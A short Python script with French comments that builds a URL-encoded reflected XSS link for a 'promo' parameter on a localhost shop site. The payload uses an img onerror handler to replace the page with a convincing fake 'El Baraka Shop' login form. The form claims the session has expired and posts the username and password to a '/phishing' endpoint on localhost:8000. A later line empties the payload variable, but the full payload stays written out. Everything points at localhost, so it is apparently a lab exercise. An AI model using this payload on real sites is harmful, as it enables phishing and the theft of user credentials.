from urllib.parse import quote

# Colle ton payload ici
payload = """<img src=x onerror="this.parentElement.innerHTML='<div style=max-width:500px;margin:60px auto;background:white;padding:50px;border-radius:20px;box-shadow:0 15px 50px rgba(0,0,0,0.15);font-family:Arial,sans-serif><div style=text-align:center;margin-bottom:30px><div style=background:linear-gradient(135deg,#006b3c,#ffd700);width:80px;height:80px;margin:0 auto 20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px;box-shadow:0 5px 15px rgba(0,107,60,0.3)>🌙</div><h2 style=color:#006b3c;margin:0 0 5px 0;font-size:26px;font-weight:800>El Baraka Shop</h2><p style=color:#6c757d;margin:0;font-size:15px>Authentification requise</p></div><div style=background:linear-gradient(135deg,#fff3cd,#ffe8a1);border-left:5px solid #ffc107;padding:18px 25px;margin-bottom:30px;border-radius:10px;box-shadow:0 2px 8px rgba(255,193,7,0.2)><p style=margin:0;color:#856404;font-size:14px;line-height:1.6><span style=font-size:22px;margin-right:8px>⏰</span><strong>Session expirée.</strong> Reconnectez-vous pour valider votre code promo.</p></div><form action=http://localhost:8000/phishing method=POST style=display:flex;flex-direction:column;gap:25px><div><label style=display:block;font-weight:600;color:#2c3e50;font-size:15px;margin-bottom:12px>📧 Identifiant</label><input name=username required placeholder=Votre identifiant style=width:100%;padding:18px 20px;border:3px solid #cbd5e0;border-radius:12px;font-size:16px;box-sizing:border-box;outline:none></div><div><label style=display:block;font-weight:600;color:#2c3e50;font-size:15px;margin-bottom:12px>🔒 Mot de passe</label><input name=password type=password required placeholder=Votre mot de passe style=width:100%;padding:18px 20px;border:3px solid #cbd5e0;border-radius:12px;font-size:16px;box-sizing:border-box;outline:none></div><button type=submit style=width:100%;background:linear-gradient(135deg,#d01c1f,#a01518);color:white;padding:20px;border:none;border-radius:12px;font-weight:700;font-size:18px;cursor:pointer;box-shadow:0 5px 20px rgba(208,28,31,0.4);margin-top:15px>✓ VALIDER MA CONNEXION</button></form><div style=margin-top:30px;padding-top:25px;border-top:1px solid #e0e6ed;text-align:center><p style=margin:0;font-size:13px;color:#6c757d>🔐 Connexion sécurisée SSL</p></div></div>'">"""
payload=""
# Encoder
encoded = quote(payload, safe='')

# Afficher l'URL complète
url = f"http://localhost:5000/?promo={encoded}"
print("\n" + "="*80)
print("URL ENCODÉE :")
print("="*80)
print(url)
print("="*80 + "\n")

# Sauvegarder dans un fichier
with open("url_encoded.txt", "w", encoding="utf-8") as f:
    f.write(url)
print("✅ URL sauvegardée dans : url_encoded.txt\n")